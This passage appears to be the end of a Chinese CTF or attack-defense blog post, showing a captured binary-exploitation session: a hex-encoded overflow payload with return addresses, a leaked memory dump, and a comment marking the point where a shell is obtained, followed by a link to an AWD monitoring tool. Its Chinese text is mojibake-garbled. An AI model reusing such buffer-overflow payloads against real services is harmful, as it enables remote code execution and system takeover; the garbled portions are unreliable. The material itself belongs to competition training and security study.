r_0 = "\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x00\x00\x00\x00\x00\x00\x00\x00\x2a\x13\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x18\x40\x40\x00\x00\x00\x00\x00\x30\x00\x00\x00\x00\x00\x00\x00\x18\x40\x40\x00\x00\x00\x00\x00\x10\x13\x40\x00\x00\x00\x00\x00\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\xfd\x11\x40\x00\x00\x00\x00\x00\x0a"

<-------------------- write ----------------->
\80\C2`\00\00\00i`\00\00Ğš`\00\00p`\00\00p@\00\00\00\00\00\00\00\00\00\00\00\00\00This challenge no backdoor!
w_1 = "\x80\xc2\x16\x0e\x60\x7f\x00\x00\x00\x69\x1e\x0e\x60\x7f\x00\x00\xd0\x9a\x0e\x0e\x60\x7f\x00\x00\x70\x19\x0e\x0e\x60\x7f\x00\x00\x70\x10\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x54\x68\x69\x73\x20\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x20\x6e\x6f\x20\x62\x61\x63\x6b\x64\x6f\x6f\x72\x21"

<-------------------- read ------------------>
\00aaaaaaaaaaaaaaaaaaaaaaa@\00\00\00\00\003@\00\00\00\00\00\BD%!`\00\00\90`\00\00

<-------------- dangerous syscall------------>#è¿™é‡Œå°±æ˜¯è·å¾— shell äº†
<-------------- dangerous syscall------------>
```

## å…¶ä»–å·¥å…·

[AoiAWD-è½»é‡çº§ç³»ç»Ÿç¯å¢ƒæ­å»º\_aoiiawd-CSDN åšå®¢](https://blog.csdn.net/qq_57235775/article/details/129858372)
